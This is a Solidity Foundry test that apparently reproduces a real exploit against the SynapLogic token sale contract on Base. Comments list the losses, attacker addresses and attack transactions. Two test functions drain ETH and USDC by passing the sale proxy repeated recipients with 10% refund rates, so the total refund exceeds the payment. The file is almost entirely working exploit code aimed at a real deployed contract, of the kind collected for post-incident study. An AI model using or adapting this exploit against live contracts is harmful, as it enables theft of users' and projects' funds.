// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~27.6 ETH & ~3450 USDC
// Attack Contract : 0x3821f686384c231e2F71ea093Fb6189dE803f482
// Vulnerable Contract : 0xC859aC8429fB4A5E24F24a7BEd3fE3a8Db4fb371 (implementation)
// ------ETH------
// ETH Attacker : 0x3Aa8bb3A19EECD229Cb33fbc03Ff549473e30F38
// Attack Tx : https://skylens.certik.com/tx/base/0xc54c00046364b6e889db18c73beee9b81df6b5ca822b6d262b3d30cdf376c4b1
// ------USDC------
// USDC Attacker : 0x11f9564c0e3a203e4c2b427dcae401dfc7ea3b61
// Attack Tx :
// 0xdc0f9149ace1a2fe0445fe1c096b098e0dbf06edec675a1f2f2a5c8b72bd5f10
// 0xc495621dba960f9fbe472389ff7606f4c255486e09a92efc2266b6e29f4823ff
// 0x675413fb257b5353f73f506bdff40f4c0f0902c39de235ee3e5d47d99feb4d93
// 0x2a95a0321e17e10e4a2424d71151c3194c7c731ebd79577f615babf98d8895d1
// 0x12d384a958c4eb546fdc988ed80ff5c7e97c61115f5cfcdf7465bc2df5fc267a
// 0xbf45ef7cbf764bb333aaf2a3b006bdb7451ebbbb5175cca08fb570f41c25347f
// 0xcee9a883b89622aaa427fbe4341b7ffb6b21a0e02c3deee91427c7321e02aeaa
// 0x2f21c4756760d72d8a5e017fb9900ff80812ff2dcc20eeb22c192a336b4cc798
// 0x59398c0f9a344aea7cbb848fc5821532acdcf72b49d4dc4f54de8527f4dfc710
// 0xe9df84cf4bfad72b3d6e7037e4b07520dd6bfeea09cd5a1ef12a9894ada1c26a
// 0x7a2d64bb7a52fa424a1ce6c2e3269c54362e86bbf5798b6c21e11272baf9476b
// 0x8359fbbf0a72ffac810e8d2592859a1a30317b8345f94e1b39128082482d9be6
// 0x71172cdbb5f25858ecd10fc99abe9cdf6d52551d1df0537250028bafe1559c7c
// 0x2d111d537a233e93df9ff8f9e93806d5149a8e1dc7f096652d1bcf4ad611cc90
// 0x9e7079678637563f8ea40d50d6bfd826915b0c0a54d2b8015d16224f9b9558b8

// @Analysis
// ETH Post-mortem : https://x.com/hklst4r/status/2013440353844461979?s=20, https://x.com/nn0b0dyyy/status/2013445844394279260?s=20, https://x.com/Phalcon_xyz/status/2013439544595562898
// USDC Post-mortem : https://github.com/anon-cBE4/anon-cBE4/blob/main/writeups/SynapLogic_attack_analyze.md
// Alerts : https://x.com/CertiKAlert/status/2013440963851755610?s=20, https://x.com/TenArmorAlert/status/2013432861366292520?s=20

contract SynapLogicExploitTest is Test {
    address constant SALE_PROXY = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    bytes4 constant BUY_SELECTOR = 0x670a3267;
    bytes4 constant SWAP_SELECTOR = 0x7f7f92f5;
    uint256 constant FORK_BLOCK = 41038633;
    address attacker;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        vm.label(SALE_PROXY, "SaleProxy");
        attacker = makeAddr("attacker");
        vm.label(attacker, "Attacker");
    }

    function testSynapLogicExploit() public {
        uint256 minBnb = ISale(SALE_PROXY).minBnb();
        uint256 value = minBnb > 0 ? minBnb : 1 ether;
        uint256 refundPerIter = value / 10;
        require(refundPerIter > 0, "refundPerIter=0");

        uint256 saleBal = SALE_PROXY.balance;
        uint256 maxRefund = saleBal + value;
        uint256 iters = maxRefund / refundPerIter;
        uint256 expectedRefund = refundPerIter * iters;

        address[] memory recipients = new address[](iters);
        uint256[] memory rates = new uint256[](iters);
        bool[] memory refundFlags = new bool[](iters);
        for (uint256 i = 0; i < iters; i++) {
            recipients[i] = attacker;
            rates[i] = 10;
            refundFlags[i] = true;
        }

        vm.deal(attacker, value);
        uint256 beforeBal = attacker.balance;
        emit log_named_uint("minBnb", minBnb);
        emit log_named_uint("msg.value", value);
        emit log_named_uint("saleBal", saleBal);
        emit log_named_uint("iters", iters);
        emit log_named_uint("refundPerIter", refundPerIter);
        emit log_named_uint("expectedRefund", expectedRefund);
        emit log_named_uint("attackerBefore", beforeBal);
        require(iters > 1, "insufficient liquidity for PoC");
        require(expectedRefund > value, "no profit with current liquidity");

        vm.prank(attacker);
        (bool ok, ) = SALE_PROXY.call{value: value}(
            abi.encodeWithSelector(BUY_SELECTOR, recipients, rates, refundFlags)
        );
        require(ok, "buy failed");

        uint256 afterBal = attacker.balance;
        emit log_named_uint("attackerAfter", afterBal);
        emit log_named_int("profitDelta", int256(afterBal) - int256(beforeBal));
        assertGt(afterBal, beforeBal - value);
    }

    function testSynapLogicExploitUSDC() public {
        // Get USDC token address from the sale contract
        address usdc = ISale(SALE_PROXY).tokenUsdt();
        require(usdc != address(0), "tokenUsdt address is zero");
        assert(usdc == USDC);
        vm.label(usdc, "USDC");

        // Get the amount of USDC tokens held by the sale contract
        uint256 tokenAmount = IERC20(usdc).balanceOf(SALE_PROXY);
        require(tokenAmount > 0, "sale contract holds no USDC");

        // 20 * 10% = 200% refund, ensuring profit
        uint256 iters = 20;
        address[] memory recipients = new address[](iters);
        uint256[] memory rates = new uint256[](iters);
        bool[] memory refundFlags = new bool[](iters);
        for (uint256 i = 0; i < iters; i++) {
            recipients[i] = attacker;
            rates[i] = 10;
            refundFlags[i] = true;
        }

        // Deal the USDC tokens to the attacker
        deal(usdc, attacker, tokenAmount);
        
        // Approve unlimited amount
        vm.prank(attacker);
        IERC20(usdc).approve(SALE_PROXY, type(uint256).max);
        
        uint256 beforeBal = IERC20(usdc).balanceOf(attacker);
        uint256 rate = 10;
        uint256 expectedRefund = (tokenAmount * iters * rate) / 100;

        emit log_named_address("usdc", usdc);
        emit log_named_uint("tokenAmount", tokenAmount);
        emit log_named_uint("iters", iters);
        emit log_named_uint("rate", rate);
        emit log_named_uint("expectedRefund", expectedRefund);
        emit log_named_uint("attackerBefore", beforeBal);

        // Call the vulnerable function with swap selector
        vm.prank(attacker);
        (bool ok, ) = SALE_PROXY.call(
            abi.encodeWithSelector(SWAP_SELECTOR, tokenAmount, recipients, rates, refundFlags)
        );
        require(ok, "swap failed");

        uint256 afterBal = IERC20(usdc).balanceOf(attacker);
        emit log_named_uint("attackerAfter", afterBal);
        emit log_named_int("profitDelta", int256(afterBal) - int256(beforeBal));
        assertGt(afterBal, beforeBal);
    }

}

interface ISale {
    function minBnb() external view returns (uint256);
    function tokenUsdt() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
